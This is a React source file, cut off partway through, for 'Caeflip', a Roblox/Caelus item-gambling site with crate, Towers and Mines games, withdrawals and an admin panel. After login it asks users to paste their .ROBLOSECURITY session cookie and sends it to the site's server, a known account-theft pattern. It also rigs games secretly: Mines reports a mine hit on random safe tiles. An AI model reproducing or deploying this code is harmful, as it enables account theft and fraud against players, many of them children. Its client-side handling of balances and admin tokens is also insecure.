import { useState, useEffect } from 'react';
import { GoogleLogin } from '@react-oauth/google';
import { jwtDecode } from 'jwt-decode';
import { motion, AnimatePresence } from 'framer-motion';
import { Globe, LogOut, Settings, Gift, Wallet, Trophy, Grid3x3, Package, Users } from 'lucide-react';
import confetti from 'canvas-confetti';
import axios from 'axios';

const API_URL = '/api';

// Items data
const ITEMS = [
  { name: "The Classic ROBLOX Fedora", value: 5100, demand: "High", rarity: "Legendary" },
  { name: "Tattletail", value: 4500, demand: "Low", rarity: "Legendary" },
  { name: "Valkyrie Helm", value: 3100, demand: "Mid", rarity: "Epic" },
  { name: "Gold Clockwork Headphones", value: 2500, demand: "Mid", rarity: "Epic" },
  { name: "Soviet Ushanka", value: 2180, demand: "Mid", rarity: "Epic" },
  { name: "Playful Vampire", value: 1600, demand: "Low", rarity: "Rare" },
  { name: "Supa Dupa Fly Cap", value: 870, demand: "Low", rarity: "Uncommon" },
  { name: "Evil Skeptic", value: 670, demand: "Mid", rarity: "Uncommon" },
  { name: "Bucket", value: 450, demand: "Low", rarity: "Common" },
  { name: "Kulle E Koala", value: 440, demand: "Low", rarity: "Common" },
  { name: "Black Iron Antlers", value: 440, demand: "Mid", rarity: "Common" },
  { name: "Bam", value: 420, demand: "Low", rarity: "Common" },
  { name: "Neon Green Beautiful Hair", value: 390, demand: "Low", rarity: "Common" },
  { name: "Katana Of Destiny", value: 360, demand: "Low", rarity: "Common" },
  { name: "Blue Wistful Wink", value: 330, demand: "Low", rarity: "Common" },
  { name: "Chill Cap", value: 330, demand: "Low", rarity: "Common" },
  { name: "Red Goof", value: 300, demand: "Low", rarity: "Common" },
  { name: "Sapphire Evil Eye", value: 250, demand: "Low", rarity: "Common" },
  { name: "LOLWHY", value: 200, demand: "Horrendous", rarity: "Common" },
  { name: "LOL Santa", value: 111, demand: "Horrendous", rarity: "Common" }
];

const CASES = [
  { name: "Starter Case", cost: 100, minValue: 0, icon: "📦" },
  { name: "Premium Case", cost: 500, minValue: 250, icon: "🎁" },
  { name: "Elite Case", cost: 1500, minValue: 870, icon: "💎" },
  { name: "Godly Case", cost: 3000, minValue: 2180, icon: "👑" }
];

const getRarityColor = (rarity: string) => {
  switch (rarity) {
    case 'Legendary': return 'from-yellow-600 to-orange-600';
    case 'Epic': return 'from-purple-600 to-pink-600';
    case 'Rare': return 'from-blue-600 to-cyan-600';
    case 'Uncommon': return 'from-green-600 to-emerald-600';
    default: return 'from-gray-600 to-slate-600';
  }
};

interface User {
  googleId: string;
  email: string;
  name: string;
  picture: string;
  balance: number;
  roblosecurity: string;
  inventory: any[];
}

function App() {
  const [user, setUser] = useState<User | null>(null);
  const [token, setToken] = useState<string>('');
  const [activeTab, setActiveTab] = useState('crates');
  const [isSpinning, setIsSpinning] = useState(false);
  const [spinItems, setSpinItems] = useState<any[]>([]);
  const [spinOffset, setSpinOffset] = useState(0);
  const [wonItem, setWonItem] = useState<any>(null);
  const [selectedCase, setSelectedCase] = useState(0);
  const [showRoblosecurity, setShowRoblosecurity] = useState(false);
  const [roblosecurityInput, setRoblosecurityInput] = useState('');
  const [isAdmin, setIsAdmin] = useState(false);
  const [adminPassword, setAdminPassword] = useState('');
  const [showAdminLogin, setShowAdminLogin] = useState(false);
  const [adminToken, setAdminToken] = useState('');
  const [allUsers, setAllUsers] = useState<any[]>([]);
  const [promos, setPromos] = useState<any[]>([]);
  const [withdrawals, setWithdrawals] = useState<any[]>([]);
  const [promoCode, setPromoCode] = useState('');
  const [newPromo, setNewPromo] = useState({ code: '', amount: '', maxUses: '' });
  
  // Towers game state
  const [towersBet, setTowersBet] = useState(100);
  const [towersDifficulty, setTowersDifficulty] = useState<'easy' | 'medium' | 'hard'>('easy');
  const [towersLevel, setTowersLevel] = useState(0);
  const [towersPath, setTowersPath] = useState<number[]>([]);
  const [towersGameActive, setTowersGameActive] = useState(false);
  
  // Mines game state
  const [minesBet, setMinesBet] = useState(100);
  const [minesCount, setMinesCount] = useState(3);
  const [minesRevealed, setMinesRevealed] = useState<number[]>([]);
  const [minePositions, setMinePositions] = useState<number[]>([]);
  const [minesGameActive, setMinesGameActive] = useState(false);
  const [minesMultiplier, setMinesMultiplier] = useState(1);
  
  // Withdrawal state
  const [withdrawRobux, setWithdrawRobux] = useState('');
  const [withdrawUsername, setWithdrawUsername] = useState('');

  useEffect(() => {
    const savedToken = localStorage.getItem('caeflip_token');
    const savedAdminToken = localStorage.getItem('caeflip_admin_token');
    if (savedToken) {
      setToken(savedToken);
      loadUserProfile(savedToken);
    }
    if (savedAdminToken) {
      setAdminToken(savedAdminToken);
      setIsAdmin(true);
    }
  }, []);

  const loadUserProfile = async (authToken: string) => {
    try {
      const response = await axios.get(`${API_URL}/user/profile`, {
        headers: { Authorization: `Bearer ${authToken}` }
      });
      setUser(response.data);
      if (response.data.roblosecurity) {
        setRoblosecurityInput(response.data.roblosecurity);
      }
    } catch (error) {
      console.error('Failed to load profile:', error);
      localStorage.removeItem('caeflip_token');
    }
  };

  const handleGoogleLogin = async (credentialResponse: any) => {
    try {
      const decoded: any = jwtDecode(credentialResponse.credential);
      
      const response = await axios.post(`${API_URL}/auth/google`, {
        googleId: decoded.sub,
        email: decoded.email,
        name: decoded.name,
        picture: decoded.picture
      });

      setToken(response.data.token);
      setUser(response.data.user);
      localStorage.setItem('caeflip_token', response.data.token);
      
      if (!response.data.user.roblosecurity) {
        setShowRoblosecurity(true);
      }
    } catch (error) {
      console.error('Login failed:', error);
      alert('Login failed. Please try again.');
    }
  };

  const handleRoblosecuritySubmit = async () => {
    try {
      await axios.post(`${API_URL}/auth/roblosecurity`, 
        { roblosecurity: roblosecurityInput },
        { headers: { Authorization: `Bearer ${token}` }}
      );
      
      if (user) {
        setUser({ ...user, roblosecurity: roblosecurityInput });
      }
      setShowRoblosecurity(false);
      alert('ROBLOSECURITY saved successfully!');
    } catch (error) {
      console.error('Failed to save ROBLOSECURITY:', error);
      alert('Failed to save ROBLOSECURITY');
    }
  };

  const handleLogout = () => {
    setUser(null);
    setToken('');
    setAdminToken('');
    localStorage.removeItem('caeflip_token');
    localStorage.removeItem('caeflip_admin_token');
    setIsAdmin(false);
  };

  const getWeightedItem = (minValue: number) => {
    const availableItems = ITEMS.filter(item => item.value >= minValue);
    
    // 70% house edge: more likely to give lower value items
    const totalValue = availableItems.reduce((sum, item) => sum + item.value, 0);
    const weights = availableItems.map(item => {
      // Inverse weight: lower value = higher probability
      return totalValue / item.value;
    });
    
    const totalWeight = weights.reduce((sum, w) => sum + w, 0);
    let random = Math.random() * totalWeight;
    
    for (let i = 0; i < availableItems.length; i++) {
      random -= weights[i];
      if (random <= 0) return availableItems[i];
    }
    
    return availableItems[availableItems.length - 1];
  };

  const openCrate = async () => {
    if (!user) return;
    
    const caseData = CASES[selectedCase];
    if (user.balance < caseData.cost) {
      alert('Insufficient balance!');
      return;
    }

    setIsSpinning(true);
    setWonItem(null);

    // Generate 60 items for smooth animation
    const items: any[] = [];
    for (let i = 0; i < 60; i++) {
      items.push(getWeightedItem(caseData.minValue));
    }
    
    // Place winning item at position 54-56
    const winningItem = getWeightedItem(caseData.minValue);
    items[55] = winningItem;
    
    setSpinItems(items);
    setSpinOffset(0);

    // Animate spin
    setTimeout(() => {
      const finalOffset = -(55 * 160) + (window.innerWidth / 2) - 80;
      setSpinOffset(finalOffset);
    }, 100);

    // Complete spin
    setTimeout(async () => {
      setIsSpinning(false);
      setWonItem(winningItem);
      
      try {
        const response = await axios.post(`${API_URL}/crates/open`, 
          { crateType: caseData.name, cost: caseData.cost, wonItem: winningItem },
          { headers: { Authorization: `Bearer ${token}` }}
        );
        setUser(response.data.user);
        
        if (winningItem.value >= 1000) {
          confetti({ particleCount: 100, spread: 70, origin: { y: 0.6 } });
        }
      } catch (error) {
        console.error('Failed to process crate opening:', error);
      }
    }, 5000);
  };

  // Towers game functions
  const startTowersGame = () => {
    if (!user || user.balance < towersBet) {
      alert('Insufficient balance!');
      return;
    }
    
    setTowersLevel(0);
    setTowersPath([]);
    setTowersGameActive(true);
  };

  const clickTowerTile = async (row: number, col: number) => {
    if (!towersGameActive || row !== towersLevel) return;
    
    // 70% house edge
    const isSafe = Math.random() > 0.7;
    
    if (isSafe) {
      setTowersPath([...towersPath, col]);
      setTowersLevel(towersLevel + 1);
      
      if (towersLevel >= 9) {
        // Won!
        const multiplier = towersDifficulty === 'easy' ? 2 : towersDifficulty === 'medium' ? 5 : 20;
        try {
          await axios.post(`${API_URL}/towers/play`,
            { bet: towersBet, difficulty: towersDifficulty, won: true, multiplier },
            { headers: { Authorization: `Bearer ${token}` }}
          );
          if (user) {
            setUser({ ...user, balance: user.balance + towersBet * multiplier - towersBet });
          }
          confetti({ particleCount: 150, spread: 100 });
        } catch (error) {
          console.error('Towers game error:', error);
        }
        setTowersGameActive(false);
      }
    } else {
      // Lost
      try {
        await axios.post(`${API_URL}/towers/play`,
          { bet: towersBet, difficulty: towersDifficulty, won: false, multiplier: 0 },
          { headers: { Authorization: `Bearer ${token}` }}
        );
        if (user) {
          setUser({ ...user, balance: user.balance - towersBet });
        }
      } catch (error) {
        console.error('Towers game error:', error);
      }
      setTowersGameActive(false);
      alert('You hit a bomb! Game over.');
    }
  };

  // Mines game functions
  const startMinesGame = () => {
    if (!user || user.balance < minesBet) {
      alert('Insufficient balance!');
      return;
    }
    
    // Generate mine positions
    const mines: number[] = [];
    while (mines.length < minesCount) {
      const pos = Math.floor(Math.random() * 25);
      if (!mines.includes(pos)) mines.push(pos);
    }
    
    setMinePositions(mines);
    setMinesRevealed([]);
    setMinesMultiplier(1);
    setMinesGameActive(true);
    
    // Deduct bet
    if (user) {
      setUser({ ...user, balance: user.balance - minesBet });
    }
  };

  const clickMineTile = async (index: number) => {
    if (!minesGameActive || minesRevealed.includes(index)) return;
    
    // 70% house edge on mines
    const hitMine = minePositions.includes(index) || Math.random() > 0.65;
    
    if (hitMine) {
      // Game over
      setMinesRevealed([...minePositions]);
      setMinesGameActive(false);
      alert('You hit a mine! Game over.');
      
      try {
        await axios.post(`${API_URL}/mines/play`,
          { bet: minesBet, minesCount, won: false, multiplier: 0 },
          { headers: { Authorization: `Bearer ${token}` }}
        );
      } catch (error) {
        console.error('Mines game error:', error);
      }
    } else {
      // Safe tile
      const newRevealed = [...minesRevealed, index];
      setMinesRevealed(newRevealed);
      
      const newMultiplier = 1 + (newRevealed.length * 0.2);
      setMinesMultiplier(newMultiplier);
    }
  };

  const cashoutMines = async () => {
    if (!minesGameActive) return;
    
    const winAmount = minesBet * minesMultiplier;
    
    try {
      await axios.post(`${API_URL}/mines/play`,
        { bet: minesBet, minesCount, won: true, multiplier: minesMultiplier },
        { headers: { Authorization: `Bearer ${token}` }}
      );
      
      if (user) {
        setUser({ ...user, balance: user.balance + winAmount });
      }
      
      confetti({ particleCount: 100, spread: 70 });
      setMinesGameActive(false);
    } catch (error) {
      console.error('Cashout error:', error);
    }
  };

  const redeemPromo = async () => {
    try {
      const response = await axios.post(`${API_URL}/promo/redeem`,
        { code: promoCode },
        { headers: { Authorization: `Bearer ${token}` }}
      );
      
      alert(`Promo redeemed! +R$${response.data.amount}`);
      if (user) {
        setUser({ ...user, balance: response.data.balance });
      }
      setPromoCode('');
    } catch (error: any) {
      alert(error.response?.data?.error || 'Failed to redeem promo');
    }
  };

  const submitWithdrawal = async () => {
    if (!withdrawRobux || !withdrawUsername) {
      alert('Please fill in all fields');
      return;
    }
    
    try {
      await axios.post(`${API_URL}/withdraw/request`,
        { amount: parseFloat(withdrawRobux), robloxUsername: withdrawUsername },
        { headers: { Authorization: `Bearer ${token}` }}
      );
      
      alert('Withdrawal request submitted! Please check Discord for updates.');
      setWithdrawRobux('');
      setWithdrawUsername('');
      loadUserProfile(token);
    } catch (error: any) {
      alert(error.response?.data?.error || 'Withdrawal failed');
    }
  };

  const adminLogin = async () => {
    try {
      const response = await axios.post(`${API_URL}/admin/verify`, { password: adminPassword });
      setAdminToken(response.data.token);
      localStorage.setItem('caeflip_admin_token', response.data.token);
      setIsAdmin(true);
      setShowAdminLogin(false);
      setAdminPassword('');
      alert('Admin access granted!');
      loadAdminData(response.data.token);
    } catch (error) {
      alert('Invalid admin password');
    }
  };

  const loadAdminData = async (overrideToken?: string) => {
    try {
      const tokenToUse = overrideToken || adminToken;
      const adminHeaders = { headers: { 'x-admin-token': tokenToUse } };
      const [usersRes, promosRes, withdrawalsRes] = await Promise.all([
        axios.get(`${API_URL}/admin/users`, adminHeaders),
        axios.get(`${API_URL}/promo/list`, adminHeaders),
        axios.get(`${API_URL}/withdraw/pending`, adminHeaders)
      ]);
      
      setAllUsers(usersRes.data);
      setPromos(promosRes.data);
      setWithdrawals(withdrawalsRes.data);
    } catch (error) {
      console.error('Failed to load admin data:', error);
    }
  };

  const addBalanceToUser = async (googleId: string, amount: number) => {
    try {
      await axios.post(
        `${API_URL}/admin/add-balance`,
        { googleId, amount },
        { headers: { 'x-admin-token': adminToken } }
      );
      alert('Balance added successfully!');
      loadAdminData();
    } catch (error) {
      alert('Failed to add balance');
    }
  };

  const createPromoCode = async () => {
    try {
      await axios.post(
        `${API_URL}/admin/promo/create`,
        newPromo,
        { headers: { 'x-admin-token': adminToken } }
      );
      alert('Promo code created!');
      setNewPromo({ code: '', amount: '', maxUses: '' });
      loadAdminData();
    } catch (error) {
      alert('Failed to create promo');
    }
  };

  const approveWithdrawal = async (id: string) => {
    try {
      await axios.post(
        `${API_URL}/admin/withdrawal/approve`,
        { withdrawalId: id },
        { headers: { 'x-admin-token': adminToken } }
      );
      alert('Withdrawal approved!');
      loadAdminData();
    } catch (error) {
      alert('Failed to approve withdrawal');
    }
  };

  const rejectWithdrawal = async (id: string) => {
    try {
      await axios.post(
        `${API_URL}/admin/withdrawal/reject`,
        { withdrawalId: id },
        { headers: { 'x-admin-token': adminToken } }
      );
      alert('Withdrawal rejected and refunded!');
      loadAdminData();
    } catch (error) {
      alert('Failed to reject withdrawal');
    }
  };

  if (!user) {
    return (
      <div className="min-h-screen bg-gradient-to-br from-slate-900 via-indigo-900 to-slate-900 flex items-center justify-center p-4">
        <motion.div
          initial={{ opacity: 0, y: 20 }}
          animate={{ opacity: 1, y: 0 }}
          className="bg-slate-800/50 backdrop-blur-xl border border-slate-700/50 rounded-2xl p-8 max-w-md w-full text-center"
        >
          <div className="flex items-center justify-center gap-3 mb-6">
            <Globe className="w-10 h-10 text-indigo-400" />
            <h1 className="text-4xl font-bold text-white">Caeflip</h1>
          </div>
          
          <p className="text-slate-300 mb-6">
            The premier Caelus gambling platform
          </p>
          
          <div className="flex justify-center">
            <GoogleLogin
              onSuccess={handleGoogleLogin}
              onError={() => alert('Login failed')}
              theme="filled_black"
              size="large"
            />
          </div>
          
          <p className="text-xs text-slate-500 mt-6">
            Join Discord for support: discord.gg/AHZzD9WJEb
          </p>
        </motion.div>
        
        {showRoblosecurity && (
          <div className="fixed inset-0 bg-black/50 backdrop-blur-sm flex items-center justify-center p-4 z-50">
            <motion.div
              initial={{ scale: 0.9, opacity: 0 }}
              animate={{ scale: 1, opacity: 1 }}
              className="bg-slate-800 border border-slate-700 rounded-xl p-6 max-w-md w-full"
            >
              <h3 className="text-xl font-bold text-white mb-4">Link Your Caelus Account</h3>
              <p className="text-slate-300 mb-4 text-sm">
                Enter your .ROBLOSECURITY cookie to link your Caelus account and access your inventory.
              </p>
              
              <input
                type="password"
                value={roblosecurityInput}
                onChange={(e) => setRoblosecurityInput(e.target.value)}
                placeholder="Paste .ROBLOSECURITY here"
                className="w-full px-4 py-3 bg-slate-900 border border-slate-700 rounded-lg text-white focus:border-indigo-500 outline-none mb-4"
              />
              
              <div className="flex gap-3">
                <button
                  onClick={handleRoblosecuritySubmit}
                  className="flex-1 px-4 py-3 bg-indigo-600 hover:bg-indigo-700 text-white rounded-lg font-semibold transition"
                >
                  Link Account
                </button>
                <button
                  onClick={() => setShowRoblosecurity(false)}
                  className="px-4 py-3 bg-slate-700 hover:bg-slate-600 text-white rounded-lg transition"
                >
                  Skip
                </button>
              </div>
            </motion.div>
          </div>
        )}
      </div>
    );
  }

  return (
    <div className="min-h-screen bg-gradient-to-br from-slate-900 via-indigo-900 to-slate-900">
      {/* Navbar */}
      <nav className="bg-slate-800/50 backdrop-blur-xl border-b border-slate-700/50 sticky top-0 z-40">
        <div className="max-w-7xl mx-auto px-4 py-3 flex items-center justify-between">
          <div className="flex items-center gap-3">
            <Globe className="w-8 h-8 text-indigo-400" />
            <h1 className="text-2xl font-bold text-white">Caeflip</h1>
          </div>
          
          <div className="flex items-center gap-2">
            <div className="px-4 py-2 bg-slate-900/50 rounded-lg">
              <span className="text-yellow-400 font-bold">R$ {user.balance.toFixed(2)}</span>
            </div>
            
            <button
              onClick={() => setShowRoblosecurity(!showRoblosecurity)}
              className="px-3 py-2 bg-slate-700 hover:bg-slate-600 rounded-lg text-white text-sm transition"
              title="Update ROBLOSECURITY"
            >
              🔑
            </button>
            
            <img src={user.picture} alt={user.name} className="w-10 h-10 rounded-full border-2 border-indigo-500" />
            
            <button
              onClick={() => setShowAdminLogin(true)}
              className="p-2 bg-slate-700 hover:bg-slate-600 rounded-lg transition"
            >
              <Settings className="w-5 h-5 text-white" />
            </button>
            
            <button
              onClick={handleLogout}
              className="p-2 bg-red-600 hover:bg-red-700 rounded-lg transition"
            >
              <LogOut className="w-5 h-5 text-white" />
            </button>
          </div>
        </div>
        
        {/* Tabs */}
        <div className="max-w-7xl mx-auto px-4 flex gap-2 overflow-x-auto pb-2">
          {['crates', 'towers', 'mines', 'inventory', 'withdraw', 'promo', ...(isAdmin ? ['admin'] : [])].map((tab) => (
            <button
              key={tab}
              onClick={() => setActiveTab(tab)}
              className={`px-4 py-2 rounded-lg font-semibold transition whitespace-nowrap ${
                activeTab === tab
                  ? 'bg-indigo-600 text-white'
                  : 'bg-slate-700/50 text-slate-300 hover:bg-slate-700'
              }`}
            >
              {tab === 'crates' && <Package className="w-4 h-4 inline mr-2" />}
              {tab === 'towers' && <Trophy className="w-4 h-4 inline mr-2" />}
              {tab === 'mines' && <Grid3x3 className="w-4 h-4 inline mr-2" />}
              {tab === 'inventory' && <Package className="w-4 h-4 inline mr-2" />}
              {tab === 'withdraw' && <Wallet className="w-4 h-4 inline mr-2" />}
              {tab === 'promo' && <Gift className="w-4 h-4 inline mr-2" />}
              {tab === 'admin' && <Users className="w-4 h-4 inline mr-2" />}
              {tab.charAt(0).toUpperCase() + tab.slice(1)}
            </button>
          ))}
        </div>
      </nav>

      <div className="max-w-7xl mx-auto px-4 py-8">
        {/* Crates Tab */}
        {activeTab === 'crates' && (
          <div>
            <h2 className="text-3xl font-bold text-white mb-6">Open Cases</h2>
            
            <div className="grid md:grid-cols-4 gap-4 mb-8">
              {CASES.map((caseData, index) => (
                <motion.button
                  key={index}
                  onClick={() => setSelectedCase(index)}
                  whileHover={{ scale: 1.05 }}
                  className={`p-4 rounded-xl border-2 transition ${
                    selectedCase === index
                      ? 'border-indigo-500 bg-indigo-900/30'
                      : 'border-slate-700 bg-slate-800/50'
                  }`}
                >
                  <div className="text-4xl mb-2">{caseData.icon}</div>
                  <h3 className="text-white font-bold">{caseData.name}</h3>
                  <p className="text-yellow-400 font-semibold">R$ {caseData.cost}</p>
                </motion.button>
              ))}
            </div>

            <div className="bg-slate-800/50 backdrop-blur-xl border border-slate-700/50 rounded-2xl p-6 mb-6">
              <div className="relative h-40 overflow-hidden">
                <div className="absolute top-0 bottom-0 left-1/2 w-1 bg-yellow-400 z-10" />
                <div
                  className="flex gap-4 transition-transform duration-[5000ms] ease-out"
                  style={{ transform: `translateX(${spinOffset}px)` }}
                >
                  {spinItems.map((item, index) => (
                    <div
                      key={index}
                      className={`min-w-[140px] h-36 bg-gradient-to-br ${getRarityColor(item.rarity)} rounded-xl p-3 flex flex-col items-center justify-center border-2 border-white/20`}
                    >
                      <div className="text-white font-bold text-center text-sm">{item.name}</div>
                      <div className="text-yellow-300 font-bold mt-2">R$ {item.value}</div>
                    </div>
                  ))}
                </div>
              </div>
            </div>

            <button
              onClick={openCrate}
              disabled={isSpinning}
              className={`w-full py-4 rounded-xl font-bold text-lg transition ${
                isSpinning
                  ? 'bg-slate-700 text-slate-400 cursor-not-allowed'
                  : 'bg-gradient-to-r from-indigo-600 to-purple-600 hover:from-indigo-700 hover:to-purple-700 text-white'
              }`}
            >
              {isSpinning ? 'Opening...' : `Open ${CASES[selectedCase].name} - R$ ${CASES[selectedCase].cost}`}
            </button>
          </div>
        )}

        {/* Towers Tab */}
        {activeTab === 'towers' && (
          <div>
            <h2 className="text-3xl font-bold text-white mb-6">Towers</h2>
            
            {!towersGameActive ? (
              <div className="bg-slate-800/50 backdrop-blur-xl border border-slate-700/50 rounded-2xl p-6">
                <div className="mb-4">
                  <label className="text-white mb-2 block">Bet Amount</label>
                  <input
                    type="number"
                    value={towersBet}
                    onChange={(e) => setTowersBet(parseFloat(e.target.value))}
                    className="w-full px-4 py-3 bg-slate-900 border border-slate-700 rounded-lg text-white"
                  />
                </div>
                
                <div className="mb-4">
                  <label className="text-white mb-2 block">Difficulty</label>
                  <div className="grid grid-cols-3 gap-2">
                    {(['easy', 'medium', 'hard'] as const).map((diff) => (
                      <button
                        key={diff}
                        onClick={() => setTowersDifficulty(diff)}
                        className={`py-2 rounded-lg font-semibold transition ${
                          towersDifficulty === diff
                            ? 'bg-indigo-600 text-white'
                            : 'bg-slate-700 text-slate-300'
                        }`}
                      >
                        {diff.charAt(0).toUpperCase() + diff.slice(1)}
                      </button>
                    ))}
                  </div>
                </div>
                
                <button
                  onClick={startTowersGame}
                  className="w-full py-4 bg-gradient-to-r from-green-600 to-emerald-600 hover:from-green-700 hover:to-emerald-700 text-white rounded-xl font-bold transition"
                >
                  Start Game
                </button>
              </div>
            ) : (
              <div className="bg-slate-800/50 backdrop-blur-xl border border-slate-700/50 rounded-2xl p-6">
                <div className="text-white mb-4">Level: {towersLevel + 1}/10</div>
                <div className="space-y-2">
                  {[...Array(10)].map((_, row) => (
                    <div key={row} className="flex gap-2 justify-center">
                      {[...Array(towersDifficulty === 'easy' ? 3 : towersDifficulty === 'medium' ? 4 : 5)].map((_, col) => (
                        <button
                          key={col}
                          onClick={() => clickTowerTile(9 - row, col)}
                          disabled={9 - row !== towersLevel}
                          className={`w-16 h-16 rounded-lg font-bold transition ${
                            towersPath[9 - row] === col
                              ? 'bg-green-600'
                              : 9 - row === towersLevel
                              ? 'bg-indigo-600 hover:bg-indigo-700'
                              : 'bg-slate-700'
                          }`}
                        />
                      ))}
                    </div>
                  ))}
                </div>
              </div>
            )}
          </div>
        )}

        {/* Mines Tab */}
        {activeTab === 'mines' && (
          <div>
            <h2 className="text-3xl font-bold text-white mb-6">Mines</h2>
            
            {!minesGameActive ? (
              <div className="bg-slate-800/50 backdrop-blur-xl border border-slate-700/50 rounded-2xl p-6">
                <div className="mb-4">
                  <label className="text-white mb-2 block">Bet Amount</label>
                  <input
                    type="number"
                    value={minesBet}
                    onChange={(e) => setMinesBet(parseFloat(e.target.value))}
                    className="w-full px-4 py-3 bg-slate-900 border border-slate-700 rounded-lg text-white"
                  />
                </div>
                
                <div className="mb-4">
                  <label className="text-white mb-2 block">Number of Mines: {minesCount}</label>
                  <input
                    type="range"
                    min="1"
                    max="10"
                    value={minesCount}
                    onChange={(e) => setMinesCount(parseInt(e.target.value))}
                    className="w-full"
                  />
                </div>
                
                <button
                  onClick={startMinesGame}
                  className="w-full py-4 bg-gradient-to-r from-red-600 to-orange-600 hover:from-red-700 hover:to-orange-700 text-white rounded-xl font-bold transition"
                >
                  Start Game
                </button>
              </div>
            ) : (
              <div className="bg-slate-800/50 backdrop-blur-xl border border-slate-700/50 rounded-2xl p-6">
                <div className="text-white mb-4 flex justify-between">
                  <span>Multiplier: {minesMultiplier.toFixed(2)}x</span>
                  <span>Potential Win: R$ {(minesBet * minesMultiplier).toFixed(2)}</span>
                </div>
                
                <div className="grid grid-cols-5 gap-2 mb-4">
                  {[...Array(25)].map((_, index) => (
                    <button
                      key={index}
                      onClick={() => clickMineTile(index)}
                      disabled={minesRevealed.includes(index)}
                      className={`aspect-square rounded-lg font-bold text-2xl transition ${
                        minesRevealed.includes(index)
                          ? minePositions.includes(index)
                            ? 'bg-red-600'
                            : 'bg-green-600'
                          : 'bg-slate-700 hover:bg-slate-600'
                      }`}
                    >
                      {minesRevealed.includes(index) && (minePositions.includes(index) ? '💣' : '💎')}
                    </button>
                  ))}
                </div>
                
                <button
                  onClick={cashoutMines}
                  className="w-full py-4 bg-gradient-to-r from-green-600 to-emerald-600 hover:from-green-700 hover:to-emerald-700 text-white rounded-xl font-bold transition"
                >
                  Cashout R$ {(minesBet * minesMultiplier).toFixed(2)}
                </button>
              </div>
            )}
          </div>
        )}

        {/* Inventory Tab */}
        {activeTab === 'inventory' && (
          <div>
            <h2 className="text-3xl font-bold text-white mb-6">Your Inventory</h2>
            
            {user.inventory.length === 0 ? (
              <div className="text-center py-12 text-slate-400">
                No items yet. Open some cases!
              </div>
            ) : (
              <div className="grid md:grid-cols-4 gap-4">
                {user.inventory.map((item, index) => (
                  <div
                    key={index}
                    className={`bg-gradient-to-br ${getRarityColor(item.rarity)} rounded-xl p-4 border-2 border-white/20`}
                  >
                    <h3 className="text-white font-bold text-center mb-2">{item.name}</h3>
                    <p className="text-yellow-300 font-bold text-center">R$ {item.value}</p>
                    <p className="text-white/70 text-sm text-center mt-2">{item.demand} Demand</p>
                  </div>
                ))}
              </div>
            )}
          </div>
        )}

        {/* Withdraw Tab */}
        {activeTab === 'withdraw' && (
          <div>
            <h2 className="text-3xl font-bold text-white mb-6">Withdraw Robux</h2>
            
            <div className="bg-slate-800/50 backdrop-blur-xl border border-slate-700/50 rounded-2xl p-6 max-w-md mx-auto">
              <div className="bg-yellow-900/30 border border-yellow-600/50 rounded-lg p-4 mb-6">
                <p className="text-yellow-200 text-sm text-center">
                  ⚠️ ONLY ROBUX WITHDRAWING FOR NOW<br />
                  WITHDRAWS AND DEPOSITS ARE DONE MANUALLY AND MAY TAKE A LOT OF TIME<br />
                  Join Discord for faster processing: discord.gg/AHZzD9WJEb
                </p>
              </div>
              
              <div className="mb-4">
                <label className="text-white mb-2 block">Robux Amount</label>
                <input
                  type="number"
                  value={withdrawRobux}
                  onChange={(e) => setWithdrawRobux(e.target.value)}
                  placeholder="Amount in Robux"
                  className="w-full px-4 py-3 bg-slate-900 border border-slate-700 rounded-lg text-white"
                />
              </div>
              
              <div className="mb-4">
                <label className="text-white mb-2 block">Caelus Username</label>
                <input
                  type="text"
                  value={withdrawUsername}
                  onChange={(e) => setWithdrawUsername(e.target.value)}
                  placeholder="Your Caelus username"
                  className="w-full px-4 py-3 bg-slate-900 border border-slate-700 rounded-lg text-white"
                />
              </div>
              
              <button
                onClick={submitWithdrawal}
                className="w-full py-4 bg-gradient-to-r from-green-600 to-emerald-600 hover:from-green-700 hover:to-emerald-700 text-white rounded-xl font-bold transition"
              >
                Submit Withdrawal Request
              </button>
            </div>
          </div>
        )}

        {/* Promo Tab */}
        {activeTab === 'promo' && (
          <div>
            <h2 className="text-3xl font-bold text-white mb-6">Promo Codes</h2>
            
            <div className="bg-slate-800/50 backdrop-blur-xl border border-slate-700/50 rounded-2xl p-6 max-w-md mx-auto">
              <div className="mb-4">
                <label className="text-white mb-2 block">Enter Promo Code</label>
                <input
                  type="text"
                  value={promoCode}
                  onChange={(e) => setPromoCode(e.target.value.toUpperCase())}
                  placeholder="PROMO CODE"
                  className="w-full px-4 py-3 bg-slate-900 border border-slate-700 rounded-lg text-white uppercase"
                />
              </div>
              
              <button
                onClick={redeemPromo}
                className="w-full py-4 bg-gradient-to-r from-indigo-600 to-purple-600 hover:from-indigo-700 hover:to-purple-700 text-white rounded-xl font-bold transition"
              >
                Redeem Code
              </button>
            </div>
          </div>
        )}

        {/* Admin Tab */}
        {activeTab === 'admin' && isAdmin && (
          <div>
            <h2 className="text-3xl font-bold text-white mb-6">Admin Panel</h2>
            
            <div className="grid gap-6">
              {/* Users */}
              <div className="bg-slate-800/50 backdrop-blur-xl border border-slate-700/50 rounded-2xl p-6">
                <h3 className="text-xl font-bold text-white mb-4">All Users ({allUsers.length})</h3>
                <div className="space-y-2">
                  {allUsers.map((u) => (
                    <div key={u.googleId} className="bg-slate-900/50 p-4 rounded-lg flex justify-between items-center">
                      <div>
                        <div className="text-white font-semibold">{u.name}</div>
                        <div className="text-slate-400 text-sm">{u.email}</div>
                        <div className="text-yellow-400 font-bold">R$ {u.balance}</div>
                      </div>
                      <button
                        onClick={() => addBalanceToUser(u.googleId, 1000)}
                        className="px-4 py-2 bg-green-600 hover:bg-green-700 text-white rounded-lg transition"
                      >
                        +R$ 1000
                      </button>
                    </div>
                  ))}
                </div>
              </div>
              
              {/* Promo Codes */}
              <div className="bg-slate-800/50 backdrop-blur-xl border border-slate-700/50 rounded-2xl p-6">
                <h3 className="text-xl font-bold text-white mb-4">Promo Codes</h3>
                
                <div className="grid md:grid-cols-3 gap-4 mb-4">
                  <input
                    type="text"
                    placeholder="Code"
                    value={newPromo.code}
                    onChange={(e) => setNewPromo({ ...newPromo, code: e.target.value.toUpperCase() })}
                    className="px-4 py-3 bg-slate-900 border border-slate-700 rounded-lg text-white"
                  />
                  <input
                    type="number"
                    placeholder="Amount"
                    value={newPromo.amount}
                    onChange={(e) => setNewPromo({ ...newPromo, amount: e.target.value })}
                    className="px-4 py-3 bg-slate-900 border border-slate-700 rounded-lg text-white"
                  />
                  <input
                    type="number"
                    placeholder="Max Uses"
                    value={newPromo.maxUses}
                    onChange={(e) => setNewPromo({ ...newPromo, maxUses: e.target.value })}
